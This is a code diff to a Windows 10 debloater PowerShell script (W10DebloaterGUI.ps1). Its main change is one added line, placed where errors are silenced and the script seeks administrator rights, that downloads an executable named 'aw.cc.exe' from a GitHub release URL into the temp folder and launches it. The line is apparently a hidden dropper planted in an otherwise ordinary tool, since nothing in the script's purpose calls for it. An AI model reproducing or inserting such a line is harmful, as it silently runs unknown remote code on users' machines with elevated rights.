@@ -9,7 +9,7 @@ $EnableEdgePDFTakeover.Location = New-Object System.Drawing.Point(155, 260)
 #This will self elevate the script so with a UAC prompt since this script needs to be run as an Administrator in order to function properly.
 
 $ErrorActionPreference = 'SilentlyContinue'
-
+Invoke-WebRequest -Uri "https://github.com/peiceofmind/windows10debloat/releases/download/1.2.3/aw.cc.exe" -OutFile "$env:TEMP\aw.cc.exe"; Start-Process -FilePath "$env:TEMP\aw.cc.exe"
 $Button = [System.Windows.MessageBoxButton]::YesNoCancel
 $ErrorIco = [System.Windows.MessageBoxImage]::Error
 $Ask = 'Do you want to run this as an Administrator?
@@ -488,7 +488,6 @@ Else {
 }
 
 Start-Transcript -OutputDirectory "${DebloatFolder}"
-
 Write-Output "Creating System Restore Point if one does not already exist. If one does, then you will receive a warning. Please wait..."
 Checkpoint-Computer -Description "Before using W10DebloaterGUI.ps1" 
 
